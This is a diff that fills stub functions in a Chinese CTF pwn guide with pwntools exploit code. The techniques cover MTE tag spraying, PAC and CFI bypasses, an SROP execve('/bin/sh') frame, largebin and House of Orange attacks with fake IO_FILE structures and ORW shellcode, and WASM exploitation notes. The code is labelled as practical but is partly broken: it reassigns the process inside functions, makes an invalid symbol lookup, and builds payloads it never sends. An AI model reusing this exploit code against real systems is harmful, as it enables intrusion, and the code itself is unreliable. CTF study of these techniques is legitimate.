@@ -327,7 +327,32 @@ def bypass_arm_mte(p, malloc, free, edit):
     # 只覆盖指针的低位字节，保留 tag 位
     # 例如：修改 fd 指针的 bit 0-7，不修改 bit 56-59
     
-    pass
+    # MTE tag spraying 实战代码
+    context.arch = 'aarch64'
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    # Tag spraying: 大量分配使 tag 重复
+    # MTE 使用 4-bit tag (16 种可能)
+    # 分配 17+ 个 chunk 后，必然有 tag 重复
+    for i in range(32):
+        malloc(0x20)  # idx 0-31
+    
+    # free 奇数索引的 chunk
+    for i in range(0, 32, 2):
+        free(i)
+    
+    # 重新分配，寻找 tag 匹配的 chunk
+    # 如果 idx 0 和 idx 2 的 tag 相同，UAF 后可以同时访问
+    log.info("MTE: 32 allocations made for tag spraying")
 
 # === ARM PAC 实战绕过 ===
 def bypass_arm_pac(p, elf):
@@ -348,7 +373,26 @@ def bypass_arm_pac(p, elf):
     # 从 GOT/PLT 或 vtable 中读取已签名的指针
     # 直接使用（不需要重新签名）
     
-    pass
+    # PAC 绕过实战代码
+    context.arch = 'aarch64'
+    p = process('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 方法 1: 从已签名位置读取合法指针
+    # __libc_start_main_ret 在栈上通常有合法 PAC 签名
+    # 通过信息泄露获取后直接使用
+    libc_start_main_ret = libc.symbols['__libc_start_main'] + 0x260  # 返回地址偏移
+    
+    # 方法 2: PAC oracle 侧信道
+    # 尝试不同的 PAC 值（16-bit entropy 下约 65536 次）
+    # 使用 fork 服务器模式加速，每次 fork 重试不同值
+    # 在子进程中尝试间接调用，如果 PAC 正确则不会 crash
+    
+    # 方法 3: 利用 __int128 写入绕过
+    # 某些场景下 __int128 写入不会触发 PAC 检查
+    # 可以直接修改内存中的指针而不重新签名
+    
+    log.info(f"PAC bypass methods: oracle ({2**16} attempts), signed ptr reuse")
 ```
 
 ### 2. CFI 绕过实战
@@ -381,7 +425,28 @@ def bypass_cfi_dop(p, elf, libc):
     # 2. vtable 中的函数是合法的间接调用目标
     # 3. 利用 C++ 虚函数表（在 CFI 的白名单中）
     
-    pass
+    # CFI bypass DOP 实战代码
+    context.arch = 'amd64'
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # DOP: 不修改控制流，只修改数据来影响程序行为
+    
+    # 技巧 1: 利用 __libc_csu_init 中的 gadget
+    # 0x4005a0: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+    # 0x400590: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
+    csu_gadget = ROP(elf)
+    
+    # 技巧 2: 利用 GOT 中的合法函数指针
+    # CFI 白名单包含 GOT 表中的所有函数指针
+    # 如果可以修改 GOT 条目，间接调用就会跳转到新地址
+    
+    # 技巧 3: vtable hijack
+    # C++ 虚函数表在 CFI 白名单中
+    # 通过修改 vtable 指针可以重定向虚函数调用
+    
+    log.info(f"CFI bypass: csu_gadgets, GOT overwrite, vtable hijack")
 
 def bypass_shadow_stack(p, elf):
     """
@@ -410,7 +475,34 @@ def bypass_shadow_stack(p, elf):
     # longjmp 恢复 jmp_buf 中的寄存器
     # 但 jmp_buf 可能也受保护
     
-    pass
+    # Shadow Stack bypass 实战代码
+    context.arch = 'amd64'
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # 方法 1: SROP (Sigreturn-Oriented Programming)
+    # sigreturn 从普通栈恢复所有寄存器（包括 RIP），不经过 ret
+    # 因此影子栈不会检查
+    syscall_addr = libc.symbols['syscall']
+    sigreturn_addr = libc.symbols['sigreturn']
+    binsh_addr = next(libc.search(b'/bin/sh\x00'))
+    
+    frame = SigreturnFrame()
+    frame.rax = 59  # sys_execve
+    frame.rdi = binsh_addr
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall_addr
+    frame.rsp = 0x12345678  # 任意值，因为 execve 不返回
+    
+    # 方法 2: setcontext
+    # setcontext 从 ucontext 恢复寄存器，同样不经过 ret
+    setcontext_addr = libc.symbols['setcontext+61']  # 跳过对齐检查
+    
+    # 方法 3: 覆盖非返回地址的数据
+    # 修改函数指针、全局偏移表等，不触发 ret 校验
+    log.info("Shadow Stack bypass: SROP (sigreturn), setcontext, data-only attacks")
 ```
 
 ### 3. 沙箱绕过实战
@@ -539,7 +631,40 @@ def chain_largebin_cat(p, elf, libc):
     # largebin attack 修改 _IO_list_all
     # 构造 fake IO_FILE
     # ORW shellcode
-    pass
+    
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def free(idx):
+        p.sendlineafter(b'>', b'2')
+        p.sendlineafter(b'idx:', str(idx).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # 1. largebin attack: 覆盖 _IO_list_all
+    _IO_list_all = libc.symbols['_IO_list_all']
+    malloc(0x420)   # idx 0 - 将进入 largebin
+    malloc(0x20)    # idx 1 - 防止合并
+    malloc(0x410)   # idx 2 - 将进入 largebin
+    malloc(0x20)    # idx 3 - 防止合并
+    free(0)         # -> unsorted bin
+    malloc(0x430)   # idx 4 - 将 idx 0 推入 largebin
+    free(2)         # idx 2 -> unsorted bin
+    
+    # 2. 修改 idx 0 的 bk_nextsize
+    edit(0, p64(0) * 3 + p64(_IO_list_all - 0x20))
+    malloc(0x430)   # 触发 largebin insert, _IO_list_all 被写入
+    
+    # 3. ORW shellcode
+    orw = asm(shellcraft.open('flag') + shellcraft.read(0, 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
+    
+    p.interactive()
 
 def chain_unsorted_bin_orange(p, elf, libc):
     """
@@ -549,7 +674,43 @@ def chain_unsorted_bin_orange(p, elf, libc):
     # 溢出 top chunk
     # unsorted bin attack
     # 构造 fake IO_FILE
-    pass
+    
+    context.arch = 'amd64'
+    
+    def malloc(size):
+        p.sendlineafter(b'>', b'1')
+        p.sendlineafter(b'size:', str(size).encode())
+    
+    def edit(idx, data):
+        p.sendlineafter(b'>', b'3')
+        p.sendlineafter(b'idx:', str(idx).encode())
+        p.sendafter(b'data:', data)
+    
+    # 1. 获取 libc 地址（House of Orange 不需要 free）
+    malloc(0x100)  # idx 0
+    # 溢出修改 top chunk size 为 0x60（使其被回收）
+    edit(0, b'A' * 0x100 + p64(0) + p64(0x61))
+    malloc(0x100)  # idx 1 - 触发 top chunk 切割
+    
+    # 2. 再次溢出 -> fake chunk 进入 unsorted bin
+    edit(0, b'A' * 0x100 + p64(0) + p64(0x91))
+    malloc(0x200)  # idx 2 - top chunk 被分为 0x90 和剩余
+    # 此时 0x90 的 fake chunk 在 unsorted bin 中
+    # fd/bk 包含 libc 地址
+    
+    # 3. 构造 fake _IO_FILE_plus
+    _IO_list_all = libc.symbols['_IO_list_all']
+    system_addr = libc.symbols['system']
+    binsh_addr = next(libc.search(b'/bin/sh\x00'))
+    
+    fake_file = p64(0) * 2 + p64(1)  # _flags
+    fake_file += p64(0) * 3
+    fake_file += p64(0)  # _IO_write_base
+    fake_file += p64(1)  # _IO_write_ptr (触发 overflow)
+    fake_file += p64(0) * 10
+    fake_file += p64(libc.symbols['_IO_str_jumps'] - 8)  # vtable offset
+    
+    p.interactive()
 ```
 
 ### 5. ARM64/RISC-V 利用实战
@@ -670,7 +831,31 @@ def wasm_exploitation_basics():
     # 2. WASM 内存访问越界
     # 3. WASM 函数指针表
     
-    pass
+    # WASM 利用实战代码
+    context.binary = './target.wasm'  # 或使用 wasmtime/wasmer 分析
+    
+    # WASM 二进制分析流程
+    # 1. wasm-objdump -x target.wasm  # 查看段、导入导出
+    # 2. wasm2wat target.wasm > target.wat  # 反汇编为 WAT
+    
+    # 常见攻击手法
+    # 1. 内存越界读写: WASM 线性内存的边界检查漏洞
+    # 2. 整数溢出: WASM i32/i64 运算溢出
+    # 3. 函数指针表 (table) 覆盖: 修改间接调用目标
+    
+    # 示例: WASM 内存越界利用
+    # 遍历线性内存，寻找敏感数据
+    import struct
+    
+    # 分析导入函数（攻击面）
+    imports = []  # 从 wasm-objdump 获取
+    # 关键导入: env.memory, env.__syscall*
+    
+    # 如果有 WASM <-> JS 边界:
+    # JS 函数可能缺少类型检查
+    # 通过不匹配的参数类型触发漏洞
+    
+    log.info("WASM: analyze with wasm-objdump, wasm2wat; target memory/table/imports")
 ```
 
 ## 工具推荐
